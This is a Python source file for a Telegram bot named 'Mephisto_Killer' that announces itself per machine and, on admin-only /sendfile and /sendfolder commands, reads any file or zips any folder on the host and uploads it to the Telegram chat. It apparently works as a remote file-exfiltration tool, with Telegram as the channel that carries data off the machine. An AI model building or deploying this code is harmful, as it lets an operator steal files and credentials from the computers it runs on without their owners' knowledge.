import telebot
import os
from bot_core.modules.file_sender import zip_folder
from bot_core.config import BOT_ADMIN_ID, MACHINE_NAME

# Define bot globally
def get_token():
    with open("token.txt", "r") as f:
        return f.read().strip()

bot = telebot.TeleBot(get_token())  # ✅ moved outside function

# Keep handlers outside the function too
@bot.message_handler(commands=['start'])
def start_handler(message):
    if message.from_user.id != BOT_ADMIN_ID:
        bot.reply_to(message, "❌ Unauthorized user.")
        return
    bot.reply_to(message, f"🤖 Mephisto_Killer active on `{MACHINE_NAME}`.\nAwaiting your command...")

@bot.message_handler(commands=['sendfile'])
def send_file(message):
    if message.from_user.id != BOT_ADMIN_ID:
        print("unauthorized")
        return
    try:
        path = message.text.split(' ', 1)[1].strip()
        if not os.path.isfile(path):
            bot.reply_to(message, "⚠️ File not found.")
            return
        with open(path, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"📤 File: `{os.path.basename(path)}`", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['sendfolder'])
def send_folder(message):
    if message.from_user.id != BOT_ADMIN_ID:
        return
    try:
        path = message.text.split(' ', 1)[1].strip()
        if not os.path.isdir(path):
            bot.reply_to(message, "⚠️ Folder not found.")
            return
        zip_path = zip_folder(path)
        with open(zip_path, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"📁 Zipped Folder: `{os.path.basename(zip_path)}`", parse_mode='Markdown')
        os.remove(zip_path)
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")
